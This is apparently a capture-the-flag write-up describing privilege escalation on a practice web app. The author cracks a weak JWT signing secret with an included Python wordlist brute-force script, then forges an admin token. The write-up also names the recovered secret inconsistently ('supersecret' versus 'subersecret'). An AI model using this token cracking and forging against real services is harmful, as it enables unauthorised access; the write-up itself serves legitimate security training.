# Web | Just What you Think

### Coin: 100

**Link**: [https://ctf-1-vo9x.vercel.app/](https://ctf-1-vo9x.vercel.app/)

# Web | Just What you Think

### Coin: 100

**Link**: https://ctf-1-vo9x.vercel.app/

### Step 1: Registering an Account

- I started by registering a new account using the **register** functionality on the website.

### Step 2: Testing Admin Access

- I reviewed the admin functions after logging in
- The response was:
    
    `You are not admin.`
    
- This indicates that my current account does **not** have admin privileges.

### Step 3: Inspecting the JWT

- I captured the **JWT (JSON Web Token)** issued after logging in.
- Then, I decoded it using [jwt.io](http://jwt.io/).
- From the decoded payload, I observed that my role or privilege level was set to:`"role": "user"`

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image.png)

### Step 4: Analyzing the JWT Setup

To escalate privileges, I needed to analyze how the JWT was being signed.

- My goal was to determine if the JWT signature was using a **weak or common secret key**.
- I suspected that the application might be signing tokens using a predictable or default key.

### Step 5: Brute-Forcing the Secret Key

- I used a Python script to brute-force the JWT secret using a wordlist of common/default secrets.
- You can find the script I used here: [python code with the top 100  default secrets including the one in the challenge `subersecret`](https://www.notion.so/python-code-with-the-top-100-default-secrets-including-the-one-in-the-challenge-subersecret-24ca4a579e0d802e9a53ea9bcb6dc889?pvs=21)
- After running the script, I discovered that the JWT secret key is:`supersecret`
- 


![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%201.png)

then i verified it on jwt.io:

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%202.png)

then in JWT Encoder i changed the role to admin using the secret key:

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%203.png)

then i set the new token 

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%204.png)

And it worked — I was able to change my role from user to admin, access the admin functionality, and retrieve the flag.

![image.png](Web%20Just%20What%20you%20Think%2024ca4a579e0d8069ae54f54bd5239881/image%205.png)

- python code with the top 100  default secrets including the one in the challenge `subersecret`
    
    ```jsx
    import jwt
    
    """
    JWT secret key bruteforce
    """
    
    # JWT Token to decode
    token = input('Enter the Token: ')
    
    # List of common secrets to try
    secrets = [
        "secret", "password", "admin", "123456", "letmein", 
        "changeme", "qwerty", "abcdef", "test", "jwtsecret",
        "admin123", "mysecret", "welcome", "123123", "1q2w3e4r", 
        "123qwe", "root", "toor", "letmein123", "password123", 
        "password1", "iloveyou", "monkey", "sunshine", "football", 
        "1234", "princess", "qwerty123", "12345", "123abc", 
        "hello", "welcome123", "123qaz", "adminadmin", "trustno1", 
        "trustnoone", "shadow", "master", "guest", "god", "test123",
        "hunter2", "admin1234", "changeme123", "p@ssw0rd", 
        "letmein1234", "welcome1", "passw0rd", "root123", "p@ssword", 
        "qwertyuiop", "monkey123", "iloveyou123", "12345qwerty", "abc123", 
        "qwertyui", "password321", "secret123", "abcd1234", "1234qwerty", 
        "1qaz2wsx", "qazwsx", "1qazXSW@", "myadmin", "letmeinqwerty", 
        "hello123", "admin12345", "12345admin", "welcome12345", "qwerty12",
        "letmeinqwerty123", "y0u45ecreT", "s3cret", "p4ssword", "secretkey", 
        "forbidden", "getoverit", "password111", "1234root", "god123", 
        "access123", "passphrase", "mysupersecret", "iloveyou1", "secure123", 
        "abcde12345", "password!123", "12345letmein", "12345secret", "asdfgh", 
        "pass123", "fakepassword", "thisispassword", "ilovepassword", "1234test",
        "secretpassword", "user123", "123456789", "welcome12345", "subersecret"
    ]
    
    # Try each secret
    for secret in secrets:
        try:
            # Attempt to decode the token with the current secret
            decoded = jwt.decode(token, secret, algorithms=['HS256'])
            print(f"[+] Success! \n[+] Secret: {secret} -> Payload: {decoded}")
            break  # Exit once the valid secret is found
        except jwt.ExpiredSignatureError:
            print(f"Expired signature, secret: {secret}")
        except jwt.InvalidTokenError:
            pass  # Ignore invalid token errors
    ```
